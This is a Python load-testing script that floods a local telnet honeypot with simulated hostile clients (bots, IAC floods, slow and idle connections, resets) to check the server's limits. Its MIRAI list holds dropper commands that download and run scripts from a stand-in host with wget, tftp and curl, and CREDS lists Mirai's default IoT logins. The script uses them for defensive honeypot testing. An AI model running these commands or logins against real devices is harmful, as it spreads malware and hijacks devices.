#!/usr/bin/env python3
"""Hostile load on examples/honeypot for a soak run: the clients a telnet
honeypot meets on the internet, all at once, from one asyncio loop.

  canary     a bot that logs in, runs commands and exits, at --canary-rate;
             its output is checked and its whole session timed (session_*)
  bots       Mirai-style scripts sent in one piece, negotiation ignored
  garbage    random bytes, up to 8 KB in up to 4 writes, then a close
  iac        telnet command floods: option requests, endless
             subnegotiations, runs of IAC IAC
  long_line  a 10 MB line with no line end, every --long-line-s seconds
  drips      --drips clients typing one byte a second until the server
             ends them (its max session length), then again
  idle       --idle connections that never send, reopened when the server
             closes them (its idle timeout)
  resets     connect, then reset at once (SO_LINGER 0)
  halfclose  a username, then shutdown(SHUT_WR); the server must close
  nonreader  commands with megabytes of output it never reads, so the
             server's writes time out

All of it comes from 127.0.0.1, so the server needs a per-IP cap above
--idle plus the rest (run.sh starts it with one). These count as errors:
a connect that fails or times out; a connection closed or reset before
its login prompt, or with no prompt within 30 s, for the clients that wait for it
(canary, bots, drips, idle, halfclose); a canary that gets the wrong output, none, or a closed
connection; a half-closed client the server doesn't close within 30 s.
The other clients' I/O errors are the server's caps cutting them off, and
are only counted, in the io_* columns.

Writes one CSV row per --sample-s interval (see soaklib.run).
"""

import argparse
import asyncio
import random
import socket
import struct
import threading
import time

import soaklib

IAC, DONT, DO, WONT, WILL, SB, SE = 255, 254, 253, 252, 251, 250, 240
CREDS = [("root", "xc3511"), ("root", "vizxv"), ("admin", "admin"), ("root", "888888"),
         ("support", "support"), ("root", "default"), ("user", "user"), ("root", "")]
MIRAI = [b"enable", b"system", b"shell", b"sh", b"/bin/busybox ECCHI",
         b"cd /tmp || cd /var/run || cd /mnt; wget http://203.0.113.9/bins.sh; chmod 777 bins.sh; sh bins.sh",
         b"echo -e '\\x41\\x4b\\x34\\x37' > .x; cat .x", b"cat /proc/cpuinfo; uname -a; ps",
         b"tftp -r t.sh -g 203.0.113.9; curl -O http://203.0.113.9/c.sh", b"/bin/busybox MIORI"]
TIMEOUT = 30.0
# The clients whose every I/O error is an error of the server's.
STRICT = {"canary", "halfclose"}
# How long a nonreader holds its connection: past the server's write
# timeout, short of its idle timeout.
NONREADER_HOLD_S = 30


class ConnectFailed(Exception):
    """A connect that failed, already logged as an error."""


class Load:
    def __init__(self, args, stats, err, stop):
        self.args, self.stats, self.err, self.stop = args, stats, err, stop
        self.rng = random.Random(args.seed)

    async def connect(self):
        try:
            return await asyncio.wait_for(
                asyncio.open_connection(self.args.host, self.args.port), TIMEOUT)
        except (OSError, asyncio.TimeoutError) as e:
            self.err("connect", f"{type(e).__name__}: {e}")
            raise ConnectFailed() from e

    async def sock_connect(self, s):
        await asyncio.wait_for(asyncio.get_running_loop().sock_connect(
            s, (self.args.host, self.args.port)), TIMEOUT)

    async def greeting(self, r, who):
        """Reads up to the login prompt; False when the server closed or
        reset the connection first or sent no prompt within TIMEOUT."""
        try:
            await asyncio.wait_for(r.readuntil(b"login: "), TIMEOUT)
            return True
        except (asyncio.IncompleteReadError, ConnectionError) as e:
            how = "closed" if isinstance(e, asyncio.IncompleteReadError) else type(e).__name__
            self.err("refused", f"{who}: {how} before the login prompt")
        except asyncio.TimeoutError:
            self.err("timeout", f"{who}: no login prompt in {TIMEOUT:.0f} s")
        return False

    def stopped(self):
        return self.stop.is_set()

    async def paced(self, rate, fn, name):
        """Starts `fn()` `rate` times a second, each in its own task."""
        if rate <= 0:
            return
        period = 1.0 / rate
        nxt = time.monotonic()
        tasks = set()
        while not self.stopped():
            nxt += period
            t = asyncio.create_task(self.guard(fn, name))
            tasks.add(t)
            t.add_done_callback(tasks.discard)
            await asyncio.sleep(max(0.0, nxt - time.monotonic()))
        for t in list(tasks):
            t.cancel()

    async def guard(self, fn, name):
        try:
            await fn()
        except asyncio.CancelledError:
            raise
        except ConnectFailed:
            pass
        except (OSError, asyncio.IncompleteReadError, asyncio.TimeoutError) as e:
            if name in STRICT:
                self.err("io", f"{name}: {type(e).__name__}: {e}")
            else:
                self.stats.add(f"io_{name}")
        except Exception as e:  # a bug in the load, not the server
            self.err("load", f"{name}: {type(e).__name__}: {e}")

    async def forever(self, fn, name):
        """Runs `fn()` again and again until the end of the run."""
        while not self.stopped():
            await self.guard(fn, name)
            await asyncio.sleep(0.1)

    # ── the clients ──

    async def canary(self):
        t0 = time.monotonic()
        r, w = await self.connect()
        try:
            if not await self.greeting(r, "canary"):
                return
            logged_in = False
            for user, pw in CREDS[:3]:
                w.write(f"{user}\r\n".encode())
                await asyncio.wait_for(r.readuntil(b"Password: "), TIMEOUT)
                w.write(f"{pw}\r\n".encode())
                out = await asyncio.wait_for(self.read_either(r, b"# ", b"login: "), TIMEOUT)
                if out.endswith(b"# "):
                    logged_in = True
                    break
            if not logged_in:
                self.err("verify", "canary: not logged in after 3 attempts")
                return
            w.write(b"uname -a; /bin/busybox SOAK\r\n")
            out = await asyncio.wait_for(r.readuntil(b"# "), TIMEOUT)
            if b"armv7l" not in out or b"SOAK: applet not found" not in out:
                self.err("verify", f"canary: unexpected output {out[:200]!r}")
                return
            w.write(b"exit\r\n")
            rest = await asyncio.wait_for(r.read(), TIMEOUT)
            if rest:
                self.err("verify", f"canary: output after exit {rest[:200]!r}")
                return
            self.stats.latency(time.monotonic() - t0, "session")
            self.stats.add("canaries")
        finally:
            w.close()

    async def read_either(self, r, a, b):
        buf = b""
        while not (buf.endswith(a) or buf.endswith(b)):
            chunk = await r.read(4096)
            if not chunk:
                raise asyncio.IncompleteReadError(buf, None)
            buf += chunk
        return buf

    async def bot(self):
        r, w = await self.connect()
        try:
            if not await self.greeting(r, "bot"):
                return
            user, pw = self.rng.choice(CREDS)
            lines = [user.encode(), pw.encode()] + self.rng.sample(MIRAI, 6)
            w.write(b"\r\n".join(lines) + b"\r\n")
            await self.drain_for(r, 2.0)
            self.stats.add("bots")
        finally:
            w.close()

    async def drain_for(self, r, seconds):
        end = time.monotonic() + seconds
        while time.monotonic() < end:
            try:
                if not await asyncio.wait_for(r.read(65536), end - time.monotonic()):
                    return
            except asyncio.TimeoutError:
                return

    async def garbage(self):
        r, w = await self.connect()
        try:
            for _ in range(self.rng.randint(1, 4)):
                w.write(self.rng.randbytes(self.rng.randint(1, 2048)))
                await w.drain()
            await self.drain_for(r, 0.2)
            self.stats.add("garbage")
        finally:
            w.close()

    async def iac(self):
        r, w = await self.connect()
        try:
            kind = self.rng.randrange(3)
            if kind == 0:
                ops = bytes(b for _ in range(5000) for b in
                            (IAC, self.rng.choice((DO, DONT, WILL, WONT)), self.rng.randrange(256)))
                w.write(ops)
            elif kind == 1:
                w.write(bytes([IAC, SB, 24]) + self.rng.randbytes(100_000).replace(b"\xff", b"\x00"))
            else:
                w.write(bytes([IAC, IAC]) * 20_000 + b"\r\n")
            await w.drain()
            await self.drain_for(r, 0.5)
            self.stats.add("iac")
        finally:
            w.close()

    async def long_line(self):
        r, w = await self.connect()
        try:
            chunk = b"A" * 65536
            sent = 0
            try:
                while sent < 10 * 1024 * 1024 and not self.stopped():
                    w.write(chunk)
                    await asyncio.wait_for(w.drain(), TIMEOUT)
                    sent += len(chunk)
            except ConnectionError:
                pass  # the server's cap on bytes per session
            self.stats.add("long_lines")
        finally:
            w.close()

    async def drip(self):
        r, w = await self.connect()
        try:
            if not await self.greeting(r, "drip"):
                return
            script = b"root\r\nxc3511\r\nroot\r\nvizxv\r\nroot\r\nadmin\r\nls -la /tmp\r\n"
            i = 0
            reader = asyncio.create_task(r.read())  # ends when the server closes
            while not self.stopped() and not reader.done():
                w.write(script[i % len(script):i % len(script) + 1])
                i += 1
                await asyncio.wait([reader], timeout=1.0)
            reader.cancel()
            self.stats.add("drips_done")
        finally:
            w.close()

    async def idle(self):
        r, w = await self.connect()
        try:
            if not await self.greeting(r, "idle"):
                return
            self.stats.add("idle_opened")
            while not self.stopped():
                try:
                    if not await asyncio.wait_for(r.read(4096), 1.0):
                        return  # the server's idle timeout
                except asyncio.TimeoutError:
                    pass
        finally:
            w.close()

    async def reset(self):
        s = socket.socket()
        s.setblocking(False)
        try:
            try:
                await self.sock_connect(s)
            except (OSError, asyncio.TimeoutError) as e:
                self.err("connect", f"reset: {type(e).__name__}: {e}")
                return
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0))
            self.stats.add("resets")
        finally:
            s.close()

    async def halfclose(self):
        r, w = await self.connect()
        try:
            if not await self.greeting(r, "halfclose"):
                return
            w.write(b"root\r\n")
            await w.drain()
            w.write_eof()
            try:
                while await asyncio.wait_for(r.read(4096), TIMEOUT):
                    pass
            except asyncio.TimeoutError:
                self.err("verify", f"halfclose: the server kept the connection {TIMEOUT:.0f} s")
                return
            self.stats.add("halfcloses")
        finally:
            w.close()

    async def nonreader(self):
        # A bare socket: an asyncio stream would read into its own buffer.
        s = socket.socket()
        try:
            s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
            s.setblocking(False)
            try:
                await self.sock_connect(s)
            except (OSError, asyncio.TimeoutError) as e:
                self.err("connect", f"{type(e).__name__}: {e}")
                raise ConnectFailed() from e
            # Each line is near the server's 4096-byte line limit and has
            # about 100 KB of output, so 30 of them outgrow the socket
            # buffers: the server's writes stall until its write timeout.
            line = b"cat /proc/cpuinfo; ps; ls -la; busybox; " * 100 + b"\r\n"
            try:
                await asyncio.wait_for(asyncio.get_running_loop().sock_sendall(
                    s, b"root\r\nxc3511\r\nroot\r\nvizxv\r\nroot\r\nadmin\r\n" + line * 30),
                    NONREADER_HOLD_S)
            except (asyncio.TimeoutError, ConnectionError):
                pass  # the server stopped reading, or has closed
            end = time.monotonic() + NONREADER_HOLD_S
            while not self.stopped() and time.monotonic() < end:
                await asyncio.sleep(1.0)
            self.stats.add("nonreaders")
        finally:
            s.close()

    async def main(self):
        a = self.args
        jobs = [
            self.paced(a.canary_rate, self.canary, "canary"),
            self.paced(a.bot_rate, self.bot, "bot"),
            self.paced(a.garbage_rate, self.garbage, "garbage"),
            self.paced(a.iac_rate, self.iac, "iac"),
            self.paced(1.0 / a.long_line_s if a.long_line_s > 0 else 0, self.long_line, "long_line"),
            self.paced(a.reset_rate, self.reset, "reset"),
            self.paced(a.halfclose_rate, self.halfclose, "halfclose"),
            self.paced(a.nonreader_rate, self.nonreader, "nonreader"),
        ]
        jobs += [self.forever(self.drip, "drip") for _ in range(a.drips)]
        tasks = [asyncio.create_task(j) for j in jobs]
        # The idle connections open over --ramp-s, so the accept queue isn't
        # flooded at the start.
        for i in range(a.idle):
            if self.stopped():
                break
            tasks.append(asyncio.create_task(self.forever(self.idle, "idle")))
            await asyncio.sleep(a.ramp_s / max(1, a.idle))
        while not self.stopped():
            await asyncio.sleep(0.2)
        for t in tasks:
            t.cancel()
        await asyncio.gather(*tasks, return_exceptions=True)


class LoopThread(threading.Thread):
    def __init__(self, load):
        super().__init__(name="asyncio")
        self.load = load

    def run(self):
        try:
            asyncio.run(self.load.main())
        except Exception as e:
            self.load.err("load", f"{type(e).__name__}: {e}")


COUNTS = ["canaries", "bots", "garbage", "iac", "long_lines", "drips_done", "idle_opened",
          "resets", "halfcloses", "nonreaders"]
COLUMNS = (["t", "elapsed_s", "interval_s"] + COUNTS
           + ["session_n", "session_p50_ms", "session_p99_ms", "session_max_ms", "errors",
              "err_refused", "err_timeout", "err_verify", "err_connect", "err_io", "err_load", "probe_ms", "probe_error"]
           + [f"io_{n}" for n in ("canary", "bot", "garbage", "iac", "long_line", "drip", "idle",
                                  "reset", "halfclose", "nonreader")])


def main():
    p = argparse.ArgumentParser(description=__doc__,
                                formatter_class=argparse.RawDescriptionHelpFormatter)
    soaklib.common_args(p, 2323)
    p.add_argument("--canary-rate", type=float, default=2, help="canary sessions/s")
    p.add_argument("--bot-rate", type=float, default=5, help="Mirai-style sessions/s")
    p.add_argument("--garbage-rate", type=float, default=5, help="random-byte sessions/s")
    p.add_argument("--iac-rate", type=float, default=2, help="telnet command floods/s")
    p.add_argument("--long-line-s", type=float, default=30, help="seconds between 10 MB lines (0: none)")
    p.add_argument("--reset-rate", type=float, default=20, help="connect-and-reset/s")
    p.add_argument("--halfclose-rate", type=float, default=2, help="half-closed sessions/s")
    p.add_argument("--nonreader-rate", type=float, default=0.2, help="clients that never read/s")
    p.add_argument("--drips", type=int, default=50, help="clients typing a byte a second")
    p.add_argument("--idle", type=int, default=5000, help="idle connections held open")
    p.add_argument("--ramp-s", type=float, default=20, help="seconds to open the idle ones")
    args = p.parse_args()

    stats = soaklib.Stats(("session",))
    err = soaklib.ErrorLog(args.errors, stats)
    stop = threading.Event()
    load = Load(args, stats, err, stop)

    def sample_extra():
        """A new connection's login prompt, timed: the server's answer
        under the load."""
        t0 = time.monotonic()
        with socket.create_connection((args.host, args.port), TIMEOUT) as s:
            s.settimeout(TIMEOUT)
            buf = b""
            while not buf.endswith(b"login: "):
                chunk = s.recv(4096)
                if not chunk:
                    raise ConnectionError("closed before the login prompt")
                buf += chunk
        return {"probe_ms": (time.monotonic() - t0) * 1000}

    soaklib.run(args, stats, COLUMNS, sample_extra, [LoopThread(load)], stop)


if __name__ == "__main__":
    main()
